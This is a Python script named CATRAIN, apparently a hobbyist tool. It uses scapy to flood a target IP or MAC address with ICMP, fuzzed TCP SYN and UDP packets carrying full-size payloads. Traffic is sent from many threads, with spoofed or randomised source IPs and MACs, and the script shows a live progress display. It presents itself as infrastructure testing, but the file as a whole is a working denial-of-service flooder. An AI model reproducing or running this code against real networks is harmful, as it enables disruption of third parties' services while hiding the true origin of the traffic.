from argparse import ArgumentParser as AP 

print("ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos' Queen >⩊<") 

import subprocess as s; from sys import exit as sexit 

try:
	if b"scapy" not in s.check_output("pip list", shell=True): 
		print("Scapy not installed... Installing for u :3 (will exit the script after -m-)"); s.call("pip install scapy", shell=True); sexit() 
except Exception as e: input(f"Scapy installation failed: {e}. Please install manually using 'pip install scapy'"); sexit() 

from argparse import ArgumentParser as AP 

def get_args():
	parser = AP(description="ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos' Queen >⩊<", prog="CATRAIN", epilog="Created by Queen of Lmaos for testing network infrastructure uwuh~") 
	parser.add_argument("-i", "--ip", type=str, help="Target IP address") 
	parser.add_argument("-c", "--count", type=int, help="Packet run count (3 packets per run)") 
	parser.add_argument("-s", "--srcip", type=str, help="Source IP. Note that if --mac = 'y'; there is no default and format is 12:90:ad:F3:7c:Eb", default="192.168.1.2") 
	parser.add_argument("-t", "--threadcount", type=int, help="Thread count") 
	parser.add_argument("-p", "--showping", type=str, choices=['y', 'n'], help="Show ping (y/n)", default="y") 
	parser.add_argument("-e", "--hidethreads", type=str, choices=['y', 'n'], help="Hide most threads from showing in UI. Recommended for 20+ threads (y/n)", default="n") 
	parser.add_argument("-d", "--data", type=str, help="The data to be sent. No more than 1456 chars. Is repeated and cut off to fill up 1456 chars (default: 'HI! :3 ')") 
	parser.add_argument("-r", "--randomsrc", type=str, choices=['y', 'n'], help="Randomize the source IP. (y/n)", default="n") 
	parser.add_argument("-m", "--mac", type=str, choices=['y', 'n'], help="In stead of an ip, target a mac address. [using ip field] (Disables pinging) (y/n)", default="n") 
	parser.add_argument("--debug", type=bool, help="Enable debug output [show errors and stop UI resets]", default=False) 
	parser.add_argument("--verbose", type=bool, help="Enable packet logs", default=False) 
	parser.add_argument("--exit", type=bool, help="Exit immediately on completion", default=False) 
	return parser.parse_args() 

from re import match as rmatch 

try: 
	args = get_args() 
	if not args.ip or args.count is None or args.threadcount is None: 
		target_ip = args.ip if args.ip else input("\t\t\t    MAC: ") if args.mac and not args.ip else input("\t\t\t      IP: ") 
		count = args.count if args.count is not None else int(input("Packet run count (3 packets per): ")) 
		threadcount = args.threadcount if args.threadcount >= 2 else int(input("\t\t    Thread count: ")) 
	else: target_ip, count, threadcount = args.ip, args.count, args.threadcount 
	if args.srcip: srcIp = args.srcip 
	if args.showping: showp = args.showping 
	if args.hidethreads: hideThreads = args.hidethreads 
	data = bytes(args.data, 'utf-8')*(int(1456/len(args.data))) if args.data else b"HI! :3 "*208 
		#! Eth MTU size = 1500, -44 for TCP blocks == 1456 ;; divide by length
	if args.randomsrc: randIp = args.randomsrc 
	if args.mac: macMode = args.mac 
	debugMode = args.debug; verbose = args.verbose 
	exitation = args.exit 
	if macMode == "y" and not rmatch(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", target_ip): raise ValueError("Invalid MAC address") 
	if macMode == "n" and not rmatch(r"^(?:25[0-5]|2[0-4]\d|1?\d{1,2})(?:\.(?:25[0-5]|2[0-4]\d|1?\d{1,2})){3}$", target_ip): raise ValueError("Invalid IPV4 address") 
except Exception as e: print(f"\nError: {str(e)}. Type more carefully ffs."); sexit() 


rno = [True] * threadcount; rcount = [0] * threadcount 


from scapy.all import IP, TCP, ICMP, UDP, Ether, send, fuzz, Raw, conf 

if not verbose:
	conf.verb = False 
else: conf.verb = True 
conf.resolve = False; conf.stealth = 1; 

conf.route_autoload = False 
conf.route6_autoload = False 


if macMode == "n":
	if randIp == "n":
		def scr(number):
			try: 
				packetI = IP(dst=target_ip, src=srcIp) / ICMP() / Raw(load=data) 
				packetT = IP(dst=target_ip, src=srcIp) / fuzz(TCP(flags='S')) / Raw(load=data) 
				packetU = IP(dst=target_ip, src=srcIp) / fuzz(UDP()) / Raw(load=data) 
				for i in range(count):
					send(packetI); send(packetT); send(packetU) 
					rcount[number] += 1 
			except Exception as e: print(e) if debugMode else 0
			rno[number] = False 
	else:
		from random import randint as r 
		def scr(number):
			src = f"{r(1, 255)}.{r(0, 255)}.{r(0, 255)}.{r(1, 255)}" 
			try: 
				packetI = IP(dst=target_ip, src=src) / ICMP() / Raw(load=data) 
				packetT = IP(dst=target_ip, src=src) / fuzz(TCP(flags='S')) / Raw(load=data) 
				packetU = IP(dst=target_ip, src=src) / fuzz(UDP()) / Raw(load=data) 
				for i in range(count):
					send(packetT); send(packetI); send(packetU) 
					rcount[number] += 1 
			except Exception as e: print(e) if debugMode else 0
			rno[number] = False 
else:
	if randIp == "n":
		def scr(number):
			try: 
				packetI = Ether(dst=target_ip, src=srcIp) / ICMP() / Raw(load=data) 
				packetT = Ether(dst=target_ip, src=srcIp) / fuzz(TCP(flags='S')) / Raw(load=data) 
				packetU = Ether(dst=target_ip, src=srcIp) / fuzz(UDP()) / Raw(load=data) 
				for i in range(count):
					send(packetT, iface = conf.iface); send(packetI, iface = conf.iface); send(packetU, iface = conf.iface) 
					rcount[number] += 1 
			except Exception as e: print(e) if debugMode else 0 
			rno[number] = False 
	else:
		from random import randint as r 
		def scr(number):
			temp = [r(0x00, 0xff) for i in range(6)]; temp[0] &= 0xfe # Multicast bit = 0 
			src = ":".join("%02x" % b for b in temp) 
			try: 
				packetI = Ether(dst=target_ip, src=src) / ICMP() / Raw(load=data) 
				packetT = Ether(dst=target_ip, src=src) / fuzz(TCP(flags='S')) / Raw(load=data) 
				packetU = Ether(dst=target_ip, src=src) / fuzz(UDP()) / Raw(load=data) 
				for i in range(count):
					send(packetT, iface = conf.iface); send(packetI, iface = conf.iface); send(packetU, iface = conf.iface) 
					rcount[number] += 1 
			except Exception as e: print(e) if debugMode else 0 
			rno[number] = False 

from threading import Thread; from time import sleep, time; from os import name as osname; from re import search as research 

starttime=time() 

threads = [] 
for x in range(threadcount):
	t = Thread(target=scr, args=(x,)); t.start() 
	threads.append(t); print(f"called sub {x+1}") 


while any(rno):
	status_lines = ["ᓚᘏᗢ CATRAIN ᗢᘏᓗ by Lmaos' Queen >⩊<", "THR no. | Running\t| Packets sent\t| Packet run no.", "—" * 56 ] 
	try: 
		sleep(0.5) 
		elt = int(research(r"\d+", str(time()-starttime)).group(0)) 
		
		if hideThreads == "n" or threadcount == 1: 
			for i in range(0, threadcount, 1): status_lines.append(f"{i+1}.\t| {rno[i]}\t\t| {str(rcount[max(i, 1)]*3).zfill(8)}\t| {str(rcount[i]).zfill(8)}") 
		else: 
			for i in range(0, max(1, min(int(threadcount/10+0.9), 10)), 1): status_lines.append(f"{i+1}.\t| {rno[i]}\t\t| {str(rcount[max(i, 1)]*3).zfill(8)}\t| {str(rcount[i]).zfill(8)}") 
		if macMode == 'y': status_lines.append(f"\nTarget MAC:   {target_ip}") 
		else: status_lines.append(f"\nTarget IP: {target_ip}") 
		status_lines.append(f"Source {'IP' if macMode == 'n' else 'MAC'}: {srcIp if randIp == "n" else "Randomized "}    \t\tTotal estimated packets: {rcount[int(len(rcount)/2+0.9)]*3*threadcount}") 
		if hideThreads == "y": status_lines.append(f"Time: {int((elt-(elt%(60**2)))/(60*60))}h {int((elt-(elt%60))/60)}min {elt%60}s\t\t\tTotal threads: {threadcount}") 
		else: status_lines.append(f"Time: {int((elt-(elt%(60**2)))/(60*60))}h {int((elt-(elt%60))/60)}min {elt%60}s") 
		status_lines.append(f"Completion: {str(research(r"\d+[\.,](?:\d\d\d|\d\d|\d)", str((rcount[int(len(rcount)/2+0.9)]/count)*100)).group(0))}%\t\t\tData: {"HI! :3 " if not args.data else f"'{args.data}'"}") 
		
		if not debugMode: 
			if osname == "nt": s.call("cls", shell=True) 
			else: s.call("clear", shell=True) 
		
		print("\n".join(status_lines)+"\n") 
	except Exception as e: print(e) if debugMode else 0 

input("All sent~~") if not exitation else print("All sent~~") 
